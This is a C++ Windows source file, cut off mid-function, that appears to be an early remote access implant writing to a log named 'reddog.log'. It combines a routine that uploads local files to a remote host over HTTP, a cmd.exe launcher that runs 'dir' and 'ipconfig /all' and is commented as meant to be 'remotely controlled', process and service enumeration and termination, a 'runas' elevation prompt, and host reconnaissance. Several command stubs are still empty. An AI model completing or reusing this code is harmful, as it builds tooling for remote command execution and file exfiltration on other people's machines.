#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <wininet.h>
#include <psapi.h>
#include <tlhelp32.h>

#include <stdio.h>
#include <string.h>
#include <fcntl.h>
#include <io.h>

#include "RedirectProcessIO.h"

#define PATH_BUFFER (1024)
#define COMMMAND_BUFFER (8192)


int http_get(char *host, char *uri, char *headers)
{

	HINTERNET hSession = InternetOpen(
		"Mozilla/5.0", // User-Agent
		INTERNET_OPEN_TYPE_PRECONFIG,
		NULL,
		NULL,
		0);

	HINTERNET hConnect = InternetConnect(
		hSession,
		host, // HOST
		0,
		"",
		"",
		INTERNET_SERVICE_HTTP,
		0,
		0);

	HINTERNET hHttpFile = HttpOpenRequest(
		hConnect,
		"GET", // METHOD
		uri,   // URI
		NULL,
		NULL,
		NULL,
		INTERNET_FLAG_RELOAD,
		0);


	HttpAddRequestHeaders(hHttpFile, headers, -1, HTTP_ADDREQ_FLAG_ADD);


	while (!HttpSendRequest(hHttpFile, NULL, 0, 0, 0)) {
		printf("HttpSendRequest error : (%lu)\n", GetLastError());

		InternetErrorDlg(
			GetDesktopWindow(),
			hHttpFile,
			ERROR_INTERNET_CLIENT_AUTH_CERT_NEEDED,
			FLAGS_ERROR_UI_FILTER_FOR_ERRORS |
			FLAGS_ERROR_UI_FLAGS_GENERATE_DATA |
			FLAGS_ERROR_UI_FLAGS_CHANGE_OPTIONS,
			NULL);
	}

	char bufQuery[32];
	DWORD dwLengthBufQuery;
	dwLengthBufQuery = sizeof(bufQuery);
	DWORD dwIndex;
	dwIndex = 0;

	// get Content-Length value but... too small
	BOOL bQuery;
	bQuery = HttpQueryInfo(
	hHttpFile,
	HTTP_QUERY_CONTENT_LENGTH,
	bufQuery,
	&dwLengthBufQuery,
	&dwIndex);
	if (!bQuery)
	printf("HttpQueryInfo error : <%lu>\n", GetLastError());

	DWORD dwFileSize;
	dwFileSize = (DWORD)atol(bufQuery);
//	dwFileSize = BUFSIZ;

	char* buffer;
	buffer = new char[dwFileSize + 1];

	while (true)
	{
		DWORD dwBytesRead;
		BOOL bRead;

		bRead = InternetReadFile(
			hHttpFile,
			buffer,
			dwFileSize + 1,
			&dwBytesRead);

		if (dwBytesRead == 0) break;

		if (!bRead)
		{
			printf("InternetReadFile error : <%lu>\n", GetLastError());
		}
		else
		{
			buffer[dwBytesRead] = 0;
			printf("Retrieved %lu data bytes: %s\n", dwBytesRead, buffer);
		}

		break;
	}

	InternetCloseHandle(hHttpFile);
	InternetCloseHandle(hConnect);
	InternetCloseHandle(hSession);

	return 0;
}


 // place holder, essentially copy of above right now
int http_put(char *host, char *uri, char *headers, char *data, int length)
{

	HINTERNET hSession = InternetOpen(
		"Mozilla/5.0", // User-Agent
		INTERNET_OPEN_TYPE_PRECONFIG,
		NULL,
		NULL,
		0);

	HINTERNET hConnect = InternetConnect(
		hSession,
		host, // HOST
		0,
		"",
		"",
		INTERNET_SERVICE_HTTP,
		0,
		0);

	HINTERNET hHttpFile = HttpOpenRequest(
		hConnect,
		"GET", // METHOD
		uri,   // URI
		NULL,
		NULL,
		NULL,
		INTERNET_FLAG_RELOAD,
		0);


	HttpAddRequestHeaders(hHttpFile, headers, -1, HTTP_ADDREQ_FLAG_ADD);


	while (!HttpSendRequest(hHttpFile, NULL, 0, 0, 0)) {
		printf("HttpSendRequest error : (%lu)\n", GetLastError());

		InternetErrorDlg(
			GetDesktopWindow(),
			hHttpFile,
			ERROR_INTERNET_CLIENT_AUTH_CERT_NEEDED,
			FLAGS_ERROR_UI_FILTER_FOR_ERRORS |
			FLAGS_ERROR_UI_FLAGS_GENERATE_DATA |
			FLAGS_ERROR_UI_FLAGS_CHANGE_OPTIONS,
			NULL);
	}

	/*
	char bufQuery[32];
	DWORD dwLengthBufQuery;
	dwLengthBufQuery = sizeof(bufQuery);
	DWORD dwIndex;
	dwIndex = 0;

	// get Content-Length value but... too small
	BOOL bQuery;
	bQuery = HttpQueryInfo(
	hHttpFile,
	HTTP_QUERY_CONTENT_LENGTH,
	bufQuery,
	&dwLengthBufQuery,
	&dwIndex);
	if (!bQuery)
	printf("HttpQueryInfo error : <%lu>\n", GetLastError());
	*/

	DWORD dwFileSize;
	//dwFileSize = (DWORD)atol(bufQuery);
	dwFileSize = BUFSIZ;

	char* buffer;
	buffer = new char[dwFileSize + 1];

	while (true)
	{
		DWORD dwBytesRead;
		BOOL bRead;

		bRead = InternetReadFile(
			hHttpFile,
			buffer,
			dwFileSize + 1,
			&dwBytesRead);

		if (dwBytesRead == 0) break;

		if (!bRead)
		{
			printf("InternetReadFile error : <%lu>\n", GetLastError());
		}
		else
		{
			buffer[dwBytesRead] = 0;
			printf("Retrieved %lu data bytes: %s\n", dwBytesRead, buffer);
		}
	}

	InternetCloseHandle(hHttpFile);
	InternetCloseHandle(hConnect);
	InternetCloseHandle(hSession);

	return 0;
}


// This is just a *very* windows specific version of opening a file
char *get_file_windows(char *file, int &length)
{
	HANDLE hFile = CreateFile(file, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL | FILE_FLAG_SEQUENTIAL_SCAN, NULL);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		printf("CreateFile Error\n");
		return NULL;
	}

	DWORD dwFileSize = GetFileSize(hFile, NULL);
	if (dwFileSize == INVALID_FILE_SIZE)
	{
		printf("GetFileSize Error\n");
		return NULL;
	}


	length = dwFileSize;
	char *data = (char *)malloc(dwFileSize);
	if (data == NULL)
	{
		printf("malloc failed\n");
		return NULL;
	}


	DWORD dw = 0, dwBytes;
	while (dw < dwFileSize)
	{
		char *pData = data;

		if (!ReadFile(hFile, pData, dwFileSize - dw, &dwBytes, NULL))
		{
			printf("ReadFile Error\n");
			return NULL;
		}
		pData += dwBytes;
		dw += dwBytes;
	}

	CloseHandle(hFile);

	return data;
}

// Essentially just a call to HttpSendRequest with a file wrapped in a multipart header/footer
int HttpUploadFile(char *data, int length, char *host, char *uri)
{
	const char *szHeaders = "Content-Type: multipart/form-data; boundary=----974767299852498929531610575";
	const char *prefix = "------974767299852498929531610575\r\nContent-Disposition: form-data; name=\"file\"; filename=\"main.cpp\"\r\nContent-Type: application/octet-stream\r\n\r\n";
	const char *suffix = "\r\n------974767299852498929531610575--\r\n";
	int prefixSize = strlen(prefix);
	size_t suffixSize = strlen(suffix);

	int post_size = prefixSize + length + suffixSize;

	char *vBuffer = (char *)malloc(post_size);

	// add prefix
	memcpy(vBuffer, prefix, prefixSize);

	// add data
	memcpy(vBuffer + prefixSize, data, length);

	// add suffix
	memcpy(vBuffer + prefixSize + length, suffix, suffixSize);


	HINTERNET hInternet = InternetOpen("Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
	if (hInternet == NULL)
	{
		printf("InternetOpen Error\n");
		return -1;
	}

	HINTERNET hConnect = InternetConnect(hInternet, host, 80, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
	if (hConnect == NULL)
	{
		printf("InternetConnect Error\n");
		return -1;
	}

	HINTERNET hRequest = HttpOpenRequest(hConnect, "POST", uri, NULL, NULL, NULL, 0, 0);
	if (hRequest == NULL)
	{
		printf("HttpOpenRequest Error\n");
		return -1;
	}

	if (!HttpSendRequest(hRequest, szHeaders, -1, &vBuffer[0], post_size))
	{
		printf("HttpSendRequest Error\n");
		return -1;
	}

	return 0;
}



// opens a file and calls the upload file, needs server side code to actually do something with it
int upload_file(char *filename, char *host, char *uri)
{
	int length = 0;
	char *data = get_file_windows(filename, length);

	HttpUploadFile(data, length, host, uri);

	return 0;
}



// start cmd.exe and issue some commands, will eventually be remotely controlled
int start_shell()
{
	RedirectProcessIO process;
	char buffer[COMMMAND_BUFFER] = { 0 };


	char path[1024] = { 0 };
	unsigned int ret = ExpandEnvironmentStringsA("%ComSpec%", path, 128);
	if (ret == 0)
	{
		GetSystemDirectory(path, PATH_BUFFER);
		strcat(path, "cmd.exe");
	}

	process.start(path);


	memset(buffer, 0, COMMMAND_BUFFER);
	process.read(buffer, COMMMAND_BUFFER);
	printf("%s\n", buffer);
	process.write("dir\n");

	memset(buffer, 0, COMMMAND_BUFFER);
	process.read(buffer, COMMMAND_BUFFER);
	printf("%s\n", buffer);

	process.write("ipconfig /all\n");

	memset(buffer, 0, COMMMAND_BUFFER);
	process.read(buffer, COMMMAND_BUFFER);
	printf("%s\n", buffer);


	process.close();

	return 0;
}

int list_processes()
{
	HANDLE hndl = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS | TH32CS_SNAPMODULE, 0);
	if (hndl)
	{
		PROCESSENTRY32  process = { sizeof(PROCESSENTRY32) };
		Process32First(hndl, &process);
		printf("Process List:\n");

		do
		{
			printf("pid %8u:\t%s\n", process.th32ProcessID, process.szExeFile);
		} while (Process32Next(hndl, &process));

		CloseHandle(hndl);
	}

	return 0;
}

int list_services()
{
	LPENUM_SERVICE_STATUS_PROCESS pServiceList = NULL;

	SC_HANDLE scMgr = OpenSCManager(
		NULL,
		NULL,
		SC_MANAGER_ENUMERATE_SERVICE | SC_MANAGER_CONNECT
	);

	if (scMgr)
	{
		DWORD myPID = GetCurrentProcessId();
		DWORD additionalNeeded;
		DWORD cnt = 0;
		DWORD resume = 0;

		ENUM_SERVICE_STATUS_PROCESS  services[1024];

		if (
			EnumServicesStatusEx(
				scMgr,
				SC_ENUM_PROCESS_INFO,        // Influences 5th parameter!
				SERVICE_WIN32_OWN_PROCESS,   // Service type (SERVICE_WIN32_OWN_PROCESS = services that run in their own process)
				SERVICE_STATE_ALL,           // Service state (ALL = active and inactive ones)
				(LPBYTE)services,
				sizeof(services),
				&additionalNeeded,
				&cnt,
				&resume,
				NULL                         // Group name
			))
		{

			printf("Service List:\n");
			for (DWORD i = 0; i < cnt; i++)
			{
				printf("pid %8d:\t%-50s \n", services[i].ServiceStatusProcess.dwProcessId, services[i].lpServiceName);
			}
		}
		CloseServiceHandle(scMgr);
	}
	else
	{
		printf("Could not open service manager.\n");
		return -1;
	}

	return 0;
}

BOOL TerminateProcess(DWORD dwProcessId, UINT uExitCode)
{
	DWORD dwDesiredAccess = PROCESS_TERMINATE;
	BOOL  bInheritHandle = FALSE;
	HANDLE hProcess = OpenProcess(dwDesiredAccess, bInheritHandle, dwProcessId);
	if (hProcess == NULL)
	{
		printf("Failed to open process\r\n");
		return FALSE;
	}

	BOOL result = TerminateProcess(hProcess, uExitCode);

	CloseHandle(hProcess);

	return result;
}


int list_process_or_service( BOOL process )
{
	if (process)
	{
		list_processes();
	}
	else
	{
		list_services();
	}

	return 0;
}

int kill_process(int pid, int exit_code)
{
	TerminateProcess(pid, exit_code);
	return 0;
}

int getf()
{
	return 0;
}

int putf()
{
	return 0;
}

int start_process_or_service()
{
	return 0;
}


// start process as user
int pidrun()
{
	return 0;
}

int geturl()
{
	return 0;
}

void RedirectIOToConsole(int debug)
{
	if (debug)
	{
		int	hConHandle;
		long	lStdHandle;
		FILE	*fp;
		CONSOLE_SCREEN_BUFFER_INFO	coninfo;

		AllocConsole();
		HWND hwndConsole = GetConsoleWindow();

		ShowWindow(hwndConsole, SW_MAXIMIZE);
		// set the screen buffer to be big enough to let us scroll text
		GetConsoleScreenBufferInfo(GetStdHandle(STD_OUTPUT_HANDLE), &coninfo);

		coninfo.dwSize.Y = 512;
		SetConsoleScreenBufferSize(GetStdHandle(STD_OUTPUT_HANDLE), coninfo.dwSize);

		// redirect unbuffered STDOUT to the console
		lStdHandle = (intptr_t)GetStdHandle(STD_OUTPUT_HANDLE);
		hConHandle = _open_osfhandle(lStdHandle, _O_TEXT);

		fp = _fdopen(hConHandle, "w");
		*stdout = *fp;
		setvbuf(stdout, NULL, _IONBF, 0);

		// redirect unbuffered STDIN to the console
		lStdHandle = (intptr_t)GetStdHandle(STD_INPUT_HANDLE);
		hConHandle = _open_osfhandle(lStdHandle, _O_TEXT);

		fp = _fdopen(hConHandle, "r");
		*stdin = *fp;
		setvbuf(stdin, NULL, _IONBF, 0);

		// redirect unbuffered STDERR to the console
		lStdHandle = (intptr_t)GetStdHandle(STD_ERROR_HANDLE);
		hConHandle = _open_osfhandle(lStdHandle, _O_TEXT);
		fp = _fdopen(hConHandle, "w");
		*stderr = *fp;
		setvbuf(stderr, NULL, _IONBF, 0);

		// make cout, wcout, cin, wcin, wcerr, cerr, wclog and clog point to console as well
		//ios::sync_with_stdio();

		//Fix issue on windows 10
		FILE *fp2 = freopen("CONOUT$", "w", stdout);
	}
	else
	{
		freopen("reddog.log", "a", stdout);
		freopen("reddog.log", "a", stderr);
	}
}


int StopDependentServices(char *service_name)
{
	DWORD i;
	DWORD dwBytesNeeded;
	DWORD dwCount;

	LPENUM_SERVICE_STATUS   lpDependencies = NULL;
	ENUM_SERVICE_STATUS     ess;
	SC_HANDLE               hDepService;
	SERVICE_STATUS_PROCESS  ssp;

	DWORD dwStartTime = GetTickCount();
	DWORD dwTimeout = 30000; // 30-second time-out

	SC_HANDLE schSCManager = OpenSCManager(
		NULL,                    // local computer
		NULL,                    // ServicesActive database 
		SC_MANAGER_ALL_ACCESS);  // full access rights 

	if (NULL == schSCManager)
	{
		printf("OpenSCManager failed (%d)\n", GetLastError());
		return -1;
	}

	SC_HANDLE schService = OpenService(
		schSCManager,         // SCM database 
		service_name,            // name of service 
		SERVICE_STOP |
		SERVICE_QUERY_STATUS |
		SERVICE_ENUMERATE_DEPENDENTS);

	// Pass a zero-length buffer to get the required buffer size.
	if (EnumDependentServices(schService, SERVICE_ACTIVE, lpDependencies, 0, &dwBytesNeeded, &dwCount))
	{
		// If the Enum call succeeds, then there are no dependent
		// services, so do nothing.
		return 0;
	}
	else
	{
		if (GetLastError() != ERROR_MORE_DATA)
		{
			printf("Unexpected error: ERROR_MORE_DATA false\n");
			return -1; // Unexpected error
		}

		// Allocate a buffer for the dependencies.
		lpDependencies = (LPENUM_SERVICE_STATUS)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwBytesNeeded);

		if (!lpDependencies)
		{
			// no dependent services, so do nothing, but return an error this time because we expected some
			return -1;
		}

		__try
		{
			// Enumerate the dependencies.
			if (!EnumDependentServices(schService, SERVICE_ACTIVE, lpDependencies, dwBytesNeeded, &dwBytesNeeded, &dwCount))
			{
				printf("EnumDependentServices failed\r\n");
				return -1;
			}

			for (i = 0; i < dwCount; i++)
			{
				ess = *(lpDependencies + i);
				// Open the service.
				hDepService = OpenService(schSCManager, ess.lpServiceName, SERVICE_STOP | SERVICE_QUERY_STATUS);

				if (!hDepService)
				{
					printf("OpenService failed\r\n");
					return -1;
				}

				__try
				{
					// Send a stop code.
					if (!ControlService(hDepService,
						SERVICE_CONTROL_STOP,
						(LPSERVICE_STATUS)&ssp))
					{
						printf("ControlService failed\r\n");
						return -1;
					}

					// Wait for the service to stop.
					while (ssp.dwCurrentState != SERVICE_STOPPED)
					{
						Sleep(ssp.dwWaitHint);
						if (!QueryServiceStatusEx(
							hDepService,
							SC_STATUS_PROCESS_INFO,
							(LPBYTE)&ssp,
							sizeof(SERVICE_STATUS_PROCESS),
							&dwBytesNeeded))
						{
							printf("QueryServiceStatusEx failed\r\n");
							return -1;
						}

						if (ssp.dwCurrentState == SERVICE_STOPPED)
							break;

						if (GetTickCount() - dwStartTime > dwTimeout)
						{
							printf("service stop timeout\r\n");
							return -1;
						}
					}
				}
				__finally
				{
					// Always release the service handle.
					CloseServiceHandle(hDepService);
				}
			}
		}
		__finally
		{
			// Always free the enumeration buffer.
			HeapFree(GetProcessHeap(), 0, lpDependencies);
		}
	}
	return 0;
}

int stop_service(char *service_name)
{
	SERVICE_STATUS_PROCESS ssp;
	DWORD dwStartTime = GetTickCount();
	DWORD dwBytesNeeded;
	DWORD dwTimeout = 30000; // 30-second time-out
	DWORD dwWaitTime;

	// Get a handle to the SCM database. 

	SC_HANDLE schSCManager = OpenSCManager(
		NULL,                    // local computer
		NULL,                    // ServicesActive database 
		SC_MANAGER_ALL_ACCESS);  // full access rights 

	if (NULL == schSCManager)
	{
		printf("OpenSCManager failed (%d)\n", GetLastError());
		return -1;
	}

	// Get a handle to the service.

	SC_HANDLE schService = OpenService(
		schSCManager,         // SCM database 
		service_name,            // name of service 
		SERVICE_STOP |
		SERVICE_QUERY_STATUS |
		SERVICE_ENUMERATE_DEPENDENTS);

	if (schService == NULL)
	{
		printf("OpenService failed (%d)\n", GetLastError());
		CloseServiceHandle(schSCManager);
		return -1;
	}

	// Make sure the service is not already stopped.

	if (!QueryServiceStatusEx(
		schService,
		SC_STATUS_PROCESS_INFO,
		(LPBYTE)&ssp,
		sizeof(SERVICE_STATUS_PROCESS),
		&dwBytesNeeded))
	{
		printf("QueryServiceStatusEx failed (%d)\n", GetLastError());
		CloseServiceHandle(schService);
		CloseServiceHandle(schSCManager);
		return -1;
	}

	if (ssp.dwCurrentState == SERVICE_STOPPED)
	{
		printf("Service is already stopped.\n");
		CloseServiceHandle(schService);
		CloseServiceHandle(schSCManager);
		return -1;
	}

	// If a stop is pending, wait for it.

	while (ssp.dwCurrentState == SERVICE_STOP_PENDING)
	{
		printf("Service stop pending...\n");

		// Do not wait longer than the wait hint. A good interval is 
		// one-tenth of the wait hint but not less than 1 second  
		// and not more than 10 seconds. 

		dwWaitTime = ssp.dwWaitHint / 10;

		if (dwWaitTime < 1000)
			dwWaitTime = 1000;
		else if (dwWaitTime > 10000)
			dwWaitTime = 10000;

		Sleep(dwWaitTime);

		if (!QueryServiceStatusEx(
			schService,
			SC_STATUS_PROCESS_INFO,
			(LPBYTE)&ssp,
			sizeof(SERVICE_STATUS_PROCESS),
			&dwBytesNeeded))
		{
			printf("QueryServiceStatusEx failed (%d)\n", GetLastError());
			CloseServiceHandle(schService);
			CloseServiceHandle(schSCManager);
			return -1;
		}

		if (ssp.dwCurrentState == SERVICE_STOPPED)
		{
			printf("Service stopped successfully.\n");
			CloseServiceHandle(schService);
			CloseServiceHandle(schSCManager);
			return -1;
		}

		if (GetTickCount() - dwStartTime > dwTimeout)
		{
			printf("Service stop timed out.\n");
			CloseServiceHandle(schService);
			CloseServiceHandle(schSCManager);
			return -1;
		}
	}

	// If the service is running, dependencies must be stopped first.

	StopDependentServices(service_name);

	// Send a stop code to the service.

	if (!ControlService(
		schService,
		SERVICE_CONTROL_STOP,
		(LPSERVICE_STATUS)&ssp))
	{
		printf("ControlService failed (%d)\n", GetLastError());
		CloseServiceHandle(schService);
		CloseServiceHandle(schSCManager);
		return -1;
	}

	// Wait for the service to stop.

	while (ssp.dwCurrentState != SERVICE_STOPPED)
	{
		Sleep(ssp.dwWaitHint);
		if (!QueryServiceStatusEx(
			schService,
			SC_STATUS_PROCESS_INFO,
			(LPBYTE)&ssp,
			sizeof(SERVICE_STATUS_PROCESS),
			&dwBytesNeeded))
		{
			printf("QueryServiceStatusEx failed (%d)\n", GetLastError());
			CloseServiceHandle(schService);
			CloseServiceHandle(schSCManager);
			return -1;
		}

		if (ssp.dwCurrentState == SERVICE_STOPPED)
			break;

		if (GetTickCount() - dwStartTime > dwTimeout)
		{
			printf("Wait timed out\n");
			CloseServiceHandle(schService);
			CloseServiceHandle(schSCManager);
			return -1;
		}
	}
	printf("Service stopped successfully\n");

	return 0;
}


BOOL IsElevated()
{
	BOOL fRet = FALSE;
	HANDLE hToken = NULL;

	if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken))
	{
		TOKEN_ELEVATION Elevation;
		DWORD cbSize = sizeof(TOKEN_ELEVATION);
		if (GetTokenInformation(hToken, TokenElevation, &Elevation, sizeof(Elevation), &cbSize))
		{
			fRet = Elevation.TokenIsElevated;
		}
	}

	if (hToken)
	{
		CloseHandle(hToken);
	}
	return fRet;
}


int request_admin(char *appname)
{
	if (IsElevated() == 0)
	{
		SHELLEXECUTEINFO shExecInfo;

		shExecInfo.cbSize = sizeof(SHELLEXECUTEINFO);

		shExecInfo.fMask = NULL;
		shExecInfo.hwnd = NULL;
		shExecInfo.lpVerb = "runas";
		shExecInfo.lpFile = appname;
		shExecInfo.lpParameters = NULL;
		shExecInfo.lpDirectory = NULL;
		shExecInfo.nShow = SW_MAXIMIZE;
		shExecInfo.hInstApp = NULL;

		ShellExecuteEx(&shExecInfo);
	}
	return 0;
}





int start_service(char *service_name)
{
	SERVICE_STATUS_PROCESS ssStatus;
	DWORD dwOldCheckPoint;
	DWORD dwStartTickCount;
	DWORD dwWaitTime;
	DWORD dwBytesNeeded;


	SC_HANDLE schSCManager = OpenSCManager(
		NULL,                    // local computer
		NULL,                    // ServicesActive database 
		SC_MANAGER_ALL_ACCESS);  // full access rights 

	if (NULL == schSCManager)
	{
		printf("OpenSCManager failed (%d)\n", GetLastError());
		return -1;
	}

	// Get a handle to the service.

	SC_HANDLE schService = OpenService(
		schSCManager,         // SCM database 
		service_name,            // name of service 
		SERVICE_STOP |
		SERVICE_QUERY_STATUS |
		SERVICE_ENUMERATE_DEPENDENTS);

	if (schService == NULL)
	{
		printf("OpenService failed (%d)\n", GetLastError());
		CloseServiceHandle(schSCManager);
		return -1;
	}


	// Get a handle to the SCM database. 

	schSCManager = OpenSCManager(
		NULL,                    // local computer
		NULL,                    // servicesActive database 
		SC_MANAGER_ALL_ACCESS);  // full access rights 

	if (NULL == schSCManager)
	{
		printf("OpenSCManager failed (%d)\n", GetLastError());
		return -1;
	}

	// Get a handle to the service.

	schService = OpenService(
		schSCManager,         // SCM database 
		service_name,            // name of service 
		SERVICE_ALL_ACCESS);  // full access 

	if (schService == NULL)
	{
		printf("OpenService failed (%d)\n", GetLastError());
		CloseServiceHandle(schSCManager);
		return -1;
	}

	// Check the status in case the service is not stopped. 

	if (!QueryServiceStatusEx(
		schService,                     // handle to service 
		SC_STATUS_PROCESS_INFO,         // information level
		(LPBYTE)&ssStatus,             // address of structure
		sizeof(SERVICE_STATUS_PROCESS), // size of structure
		&dwBytesNeeded))              // size needed if buffer is too small
	{
		printf("QueryServiceStatusEx failed (%d)\n", GetLastError());
		CloseServiceHandle(schService);
		CloseServiceHandle(schSCManager);
		return -1;
	}

	// Check if the service is already running. It would be possible 
	// to stop the service here, but for simplicity this example just returns. 

	if (ssStatus.dwCurrentState != SERVICE_STOPPED && ssStatus.dwCurrentState != SERVICE_STOP_PENDING)
	{
		printf("Cannot start the service because it is already running\n");
		CloseServiceHandle(schService);
		CloseServiceHandle(schSCManager);
		return -1;
	}

	// Save the tick count and initial checkpoint.

	dwStartTickCount = GetTickCount();
	dwOldCheckPoint = ssStatus.dwCheckPoint;

	// Wait for the service to stop before attempting to start it.

	while (ssStatus.dwCurrentState == SERVICE_STOP_PENDING)
	{
		// Do not wait longer than the wait hint. A good interval is 
		// one-tenth of the wait hint but not less than 1 second  
		// and not more than 10 seconds. 

		dwWaitTime = ssStatus.dwWaitHint / 10;

		if (dwWaitTime < 1000)
			dwWaitTime = 1000;
		else if (dwWaitTime > 10000)
			dwWaitTime = 10000;

		Sleep(dwWaitTime);

		// Check the status until the service is no longer stop pending. 

		if (!QueryServiceStatusEx(
			schService,                     // handle to service 
			SC_STATUS_PROCESS_INFO,         // information level
			(LPBYTE)&ssStatus,             // address of structure
			sizeof(SERVICE_STATUS_PROCESS), // size of structure
			&dwBytesNeeded))              // size needed if buffer is too small
		{
			printf("QueryServiceStatusEx failed (%d)\n", GetLastError());
			CloseServiceHandle(schService);
			CloseServiceHandle(schSCManager);
			return -1;
		}

		if (ssStatus.dwCheckPoint > dwOldCheckPoint)
		{
			// Continue to wait and check.

			dwStartTickCount = GetTickCount();
			dwOldCheckPoint = ssStatus.dwCheckPoint;
		}
		else
		{
			if (GetTickCount() - dwStartTickCount > ssStatus.dwWaitHint)
			{
				printf("Timeout waiting for service to stop\n");
				CloseServiceHandle(schService);
				CloseServiceHandle(schSCManager);
				return -1;
			}
		}
	}

	// Attempt to start the service.

	if (!StartService(
		schService,  // handle to service 
		0,           // number of arguments 
		NULL))      // no arguments 
	{
		printf("StartService failed (%d)\n", GetLastError());
		CloseServiceHandle(schService);
		CloseServiceHandle(schSCManager);
		return -1;
	}
	else printf("Service start pending...\n");

	// Check the status until the service is no longer start pending. 

	if (!QueryServiceStatusEx(
		schService,                     // handle to service 
		SC_STATUS_PROCESS_INFO,         // info level
		(LPBYTE)&ssStatus,             // address of structure
		sizeof(SERVICE_STATUS_PROCESS), // size of structure
		&dwBytesNeeded))              // if buffer too small
	{
		printf("QueryServiceStatusEx failed (%d)\n", GetLastError());
		CloseServiceHandle(schService);
		CloseServiceHandle(schSCManager);
		return -1;
	}

	// Save the tick count and initial checkpoint.

	dwStartTickCount = GetTickCount();
	dwOldCheckPoint = ssStatus.dwCheckPoint;

	while (ssStatus.dwCurrentState == SERVICE_START_PENDING)
	{
		// Do not wait longer than the wait hint. A good interval is 
		// one-tenth the wait hint, but no less than 1 second and no 
		// more than 10 seconds. 

		dwWaitTime = ssStatus.dwWaitHint / 10;

		if (dwWaitTime < 1000)
			dwWaitTime = 1000;
		else if (dwWaitTime > 10000)
			dwWaitTime = 10000;

		Sleep(dwWaitTime);

		// Check the status again. 

		if (!QueryServiceStatusEx(
			schService,             // handle to service 
			SC_STATUS_PROCESS_INFO, // info level
			(LPBYTE)&ssStatus,             // address of structure
			sizeof(SERVICE_STATUS_PROCESS), // size of structure
			&dwBytesNeeded))              // if buffer too small
		{
			printf("QueryServiceStatusEx failed (%d)\n", GetLastError());
			break;
		}

		if (ssStatus.dwCheckPoint > dwOldCheckPoint)
		{
			// Continue to wait and check.

			dwStartTickCount = GetTickCount();
			dwOldCheckPoint = ssStatus.dwCheckPoint;
		}
		else
		{
			if (GetTickCount() - dwStartTickCount > ssStatus.dwWaitHint)
			{
				// No progress made within the wait hint.
				break;
			}
		}
	}

	// Determine whether the service is running.
	if (ssStatus.dwCurrentState == SERVICE_RUNNING)
	{
		printf("Service started successfully.\n");
	}
	else
	{
		printf("Service not started. \n");
		printf("  Current State: %d\n", ssStatus.dwCurrentState);
		printf("  Exit Code: %d\n", ssStatus.dwWin32ExitCode);
		printf("  Check Point: %d\n", ssStatus.dwCheckPoint);
		printf("  Wait Hint: %d\n", ssStatus.dwWaitHint);
		CloseServiceHandle(schService);
		CloseServiceHandle(schSCManager);
		return -1;
	}

	CloseServiceHandle(schService);
	CloseServiceHandle(schSCManager);
	return 0;
}


void create_process_blocking(char *cmdline)
{
	STARTUPINFO si;
	PROCESS_INFORMATION pi;

	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));


	// Start the child process. 
	if (!CreateProcess(NULL,   // No module name (use command line)
		cmdline,        // Command line
		NULL,           // Process handle not inheritable
		NULL,           // Thread handle not inheritable
		FALSE,          // Set handle inheritance to FALSE
		0,              // No creation flags
		NULL,           // Use parent's environment block
		NULL,           // Use parent's starting directory 
		&si,            // Pointer to STARTUPINFO structure
		&pi)           // Pointer to PROCESS_INFORMATION structure
		)
	{
		printf("CreateProcess failed (%d).\n", GetLastError());
		return;
	}

	// Wait until child process exits.
	WaitForSingleObject(pi.hProcess, INFINITE);

	// Close process and thread handles. 
	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);
}

void create_process_nonblocking(char *cmdline)
{
	STARTUPINFO si;
	PROCESS_INFORMATION pi;

	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));


	// Start the child process. 
	if (!CreateProcess(NULL,   // No module name (use command line)
		cmdline,        // Command line
		NULL,           // Process handle not inheritable
		NULL,           // Thread handle not inheritable
		FALSE,          // Set handle inheritance to FALSE
		0,              // No creation flags
		NULL,           // Use parent's environment block
		NULL,           // Use parent's starting directory 
		&si,            // Pointer to STARTUPINFO structure
		&pi)           // Pointer to PROCESS_INFORMATION structure
		)
	{
		printf("CreateProcess failed (%d).\n", GetLastError());
		return;
	}

	// Close process and thread handles. 
	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);
}



int whoami()
{
	char username[1024];
	char compname[1024];
	DWORD buffer_size = 1024;

	if (!GetComputerName(compname, &buffer_size))
	{
		printf("GetComputerName failed\n");
		return -1;
	}


	if (!GetUserName(username, &buffer_size))
	{
		printf("GetUserName failed\n");
		return -1;
	}

	printf("User name:\t%s", username);
	printf("Computer name:\t%s", compname);

	return 0;
}

#include <comdef.h>
#include <Wbemidl.h>
#include <iostream>
using namespace std;

#pragma comment(lib, "wbemuuid.lib")

int query_wmi()
{
	HRESULT hres;

	// Step 1: --------------------------------------------------
	// Initialize COM. ------------------------------------------

	hres = CoInitializeEx(0, COINIT_MULTITHREADED);
	if (FAILED(hres))
	{
		cout << "Failed to initialize COM library. Error code = 0x"
			<< hex << hres << endl;
		return 1;                  // Program has failed.
	}

	// Step 2: --------------------------------------------------
	// Set general COM security levels --------------------------

	hres = CoInitializeSecurity(
		NULL,
		-1,                          // COM authentication
		NULL,                        // Authentication services
		NULL,                        // Reserved
		RPC_C_AUTHN_LEVEL_DEFAULT,   // Default authentication 
		RPC_C_IMP_LEVEL_IMPERSONATE, // Default Impersonation  
		NULL,                        // Authentication info
		EOAC_NONE,                   // Additional capabilities 
		NULL                         // Reserved
	);


	if (FAILED(hres))
	{
		cout << "Failed to initialize security. Error code = 0x"
			<< hex << hres << endl;
		CoUninitialize();
		return 1;                    // Program has failed.
	}

	// Step 3: ---------------------------------------------------
	// Obtain the initial locator to WMI -------------------------

	IWbemLocator *pLoc = NULL;

	hres = CoCreateInstance(
		CLSID_WbemLocator,
		0,
		CLSCTX_INPROC_SERVER,
		IID_IWbemLocator, (LPVOID *)&pLoc);

	if (FAILED(hres))
	{
		cout << "Failed to create IWbemLocator object."
			<< " Err code = 0x"
